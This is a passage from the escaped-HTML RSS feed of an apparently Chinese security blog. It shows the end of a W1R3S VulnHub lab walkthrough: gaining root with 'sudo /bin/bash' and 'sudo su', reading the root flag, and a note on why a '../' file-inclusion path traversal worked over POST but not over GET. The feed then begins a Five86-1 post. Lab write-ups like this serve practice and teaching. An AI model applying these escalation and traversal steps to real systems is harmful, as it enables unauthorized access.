+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;User w1r3s may run the following commands on W1R3S.localdomain:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;(&lt;/span&gt;ALL : ALL&lt;span class="o"&gt;)&lt;/span&gt; ALL
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这个用户是全权限用户，调用root的bash即可提权，或者sudo su&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;span class="lnt"&gt;32
+&lt;/span&gt;&lt;span class="lnt"&gt;33
+&lt;/span&gt;&lt;span class="lnt"&gt;34
+&lt;/span&gt;&lt;span class="lnt"&gt;35
+&lt;/span&gt;&lt;span class="lnt"&gt;36
+&lt;/span&gt;&lt;span class="lnt"&gt;37
+&lt;/span&gt;&lt;span class="lnt"&gt;38
+&lt;/span&gt;&lt;span class="lnt"&gt;39
+&lt;/span&gt;&lt;span class="lnt"&gt;40
+&lt;/span&gt;&lt;span class="lnt"&gt;41
+&lt;/span&gt;&lt;span class="lnt"&gt;42
+&lt;/span&gt;&lt;span class="lnt"&gt;43
+&lt;/span&gt;&lt;span class="lnt"&gt;44
+&lt;/span&gt;&lt;span class="lnt"&gt;45
+&lt;/span&gt;&lt;span class="lnt"&gt;46
+&lt;/span&gt;&lt;span class="lnt"&gt;47
+&lt;/span&gt;&lt;span class="lnt"&gt;48
+&lt;/span&gt;&lt;span class="lnt"&gt;49
+&lt;/span&gt;&lt;span class="lnt"&gt;50
+&lt;/span&gt;&lt;span class="lnt"&gt;51
+&lt;/span&gt;&lt;span class="lnt"&gt;52
+&lt;/span&gt;&lt;span class="lnt"&gt;53
+&lt;/span&gt;&lt;span class="lnt"&gt;54
+&lt;/span&gt;&lt;span class="lnt"&gt;55
+&lt;/span&gt;&lt;span class="lnt"&gt;56
+&lt;/span&gt;&lt;span class="lnt"&gt;57
+&lt;/span&gt;&lt;span class="lnt"&gt;58
+&lt;/span&gt;&lt;span class="lnt"&gt;59
+&lt;/span&gt;&lt;span class="lnt"&gt;60
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;w1r3s@W1R3S:~$ sudo /bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;root@W1R3S:~# id&lt;span class="p"&gt;;&lt;/span&gt;pwd&lt;span class="p"&gt;;&lt;/span&gt;whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/home/w1r3s
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;root@W1R3S:/root# &lt;span class="nb"&gt;exit&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;exit&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;w1r3s@W1R3S:~$ sudo su
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;root@W1R3S:/home/w1r3s# 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;root@W1R3S:~# &lt;span class="nb"&gt;cd&lt;/span&gt; /root
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;root@W1R3S:/root# ls -liah
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;total 48K
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;655361&lt;/span&gt; drwx------ &lt;span class="m"&gt;6&lt;/span&gt; root root 4.0K Feb &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2&lt;/span&gt; drwxr-xr-x &lt;span class="m"&gt;24&lt;/span&gt; root root 4.0K Mar &lt;span class="m"&gt;7&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; ..
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;659692&lt;/span&gt; -rw------- &lt;span class="m"&gt;1&lt;/span&gt; root root 7.0K Feb &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; .bash_history
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;655364&lt;/span&gt; -rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root 3.1K Oct &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;2015&lt;/span&gt; .bashrc
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;655363&lt;/span&gt; drwx------ &lt;span class="m"&gt;2&lt;/span&gt; root root 4.0K Jan &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; .cache
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;667676&lt;/span&gt; -rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root 2.0K Feb &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; flag.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;791671&lt;/span&gt; drwx------ &lt;span class="m"&gt;3&lt;/span&gt; root root 4.0K Jan &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; .gnupg
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;672157&lt;/span&gt; -rw------- &lt;span class="m"&gt;1&lt;/span&gt; root root 1.1K Jan &lt;span class="m"&gt;28&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; .mysql_history
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;789470&lt;/span&gt; drwxr-xr-x &lt;span class="m"&gt;2&lt;/span&gt; root root 4.0K Jan &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; .nano
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;655365&lt;/span&gt; -rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;148&lt;/span&gt; Aug &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="m"&gt;2015&lt;/span&gt; .profile
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;796589&lt;/span&gt; drwx------ &lt;span class="m"&gt;2&lt;/span&gt; root root 4.0K Jan &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; .ssh
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;root@W1R3S:/root# cat flag.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-----------------------------------------------------------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ____ ___ _ _ ____ ____ _ _____ _ _ _ _ _____ ___ ___ _ _ ____ 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; / ___/ _ &lt;span class="se"&gt;\|&lt;/span&gt; &lt;span class="se"&gt;\ &lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;/ ___&lt;span class="p"&gt;|&lt;/span&gt; _ &lt;span class="se"&gt;\ &lt;/span&gt; / &lt;span class="se"&gt;\|&lt;/span&gt;_ _&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; / &lt;span class="se"&gt;\|&lt;/span&gt;_ _&lt;span class="p"&gt;|&lt;/span&gt;_ _/ _ &lt;span class="se"&gt;\|&lt;/span&gt; &lt;span class="se"&gt;\ &lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt; / ___&lt;span class="p"&gt;|&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="se"&gt;\|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; _&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;_&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; / _ &lt;span class="se"&gt;\ &lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; / _ &lt;span class="se"&gt;\ &lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="se"&gt;\|&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt;__ &lt;span class="se"&gt;\ &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;__&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;_&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="se"&gt;\ &lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;_&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; _ &amp;lt; / ___ &lt;span class="se"&gt;\|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;_&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;___ / ___ &lt;span class="se"&gt;\|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;_&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="se"&gt;\ &lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;___&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="se"&gt;\_&lt;/span&gt;___&lt;span class="se"&gt;\_&lt;/span&gt;__/&lt;span class="p"&gt;|&lt;/span&gt;_&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="se"&gt;\_&lt;/span&gt;___&lt;span class="p"&gt;|&lt;/span&gt;_&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="se"&gt;\_\/&lt;/span&gt;_/ &lt;span class="se"&gt;\_\_&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt;__/&lt;span class="p"&gt;|&lt;/span&gt;_____/_/ &lt;span class="se"&gt;\_\_&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;___&lt;span class="se"&gt;\_&lt;/span&gt;__/&lt;span class="p"&gt;|&lt;/span&gt;_&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;____/ 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-----------------------------------------------------------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; .-----------------TTTT_-----_______
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; /&lt;span class="s1"&gt;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;______O&lt;span class="o"&gt;]&lt;/span&gt; ----------____ &lt;span class="se"&gt;\_&lt;/span&gt;_____/&lt;span class="o"&gt;]&lt;/span&gt;_
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; __...---&lt;span class="s1"&gt;&amp;#39;&amp;#34;&amp;#34;&amp;#34;\_ --&amp;#39;&amp;#39; Q ___________@
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt; |&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt; ._ &lt;span class="nv"&gt;_______________&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;---------&lt;span class="s2"&gt;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt; | ..--&amp;#39;&amp;#39;| l L |_l |
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt; | ..--&amp;#39;&amp;#39; . /-___j &amp;#39; &amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt; | ..--&amp;#39;&amp;#39; / , &amp;#39; &amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt; |--&amp;#39;&amp;#39; / ` \
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt; L__&amp;#39; \ -
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt; - &amp;#39;-.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt; &amp;#39;. /
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt; &amp;#39;-./
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;----------------------------------------------------------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt; YOU HAVE COMPLETED THE
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt; __ __ ______________________ _________
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt; / \ / \/_ \______ \_____ \ / _____/
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt; \ \/\/ / | || _/ _(__ &amp;lt; \_____ \ 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt; \ / | || | \/ \/ \
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt; \__/\ / |___||____|_ /______ /_______ /.INC
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt; \/ \/ \/ \/ CHALLENGE, V 1.0
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;----------------------------------------------------------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;CREATED BY SpecterWires
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;----------------------------------------------------------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;root@W1R3S:/root# 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id="问题的总结"&gt;问题的总结
+&lt;/h2&gt;&lt;p&gt;为什么之前的GET请求失败？&lt;/p&gt;
+&lt;p&gt;答：GET 请求中的 &lt;code&gt;../&lt;/code&gt; 可能被 Apache 或 PHP 的路径规范化处理，导致 &lt;code&gt;include&lt;/code&gt; 收到的路径不对；而 POST 请求体中的 &lt;code&gt;../&lt;/code&gt; 不会经过 URL 路径规范化，所以能成功。&lt;/p&gt;</description></item><item><title>Five86-1 Vulnhub靶场复现</title><link>https://ke1thli.github.io/p/five86-1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</link><pubDate>Sun, 11 Oct 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/five86-1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</guid><description>&lt;h1 id="five86-1-vulnhub靶场复现"&gt;Five86-1 VulnHub靶场复现
 &lt;/h1&gt;&lt;h1 id="靶场复现"&gt;靶场复现
 &lt;/h1&gt;&lt;p&gt;靶场地址 &lt;a class="link" href="https://www.vulnhub.com/entry/five86-1%2C417/" target="_blank" rel="noopener"
  &gt;https://www.vulnhub.com/entry/five86-1%2C417/&lt;/a&gt;&lt;/p&gt;
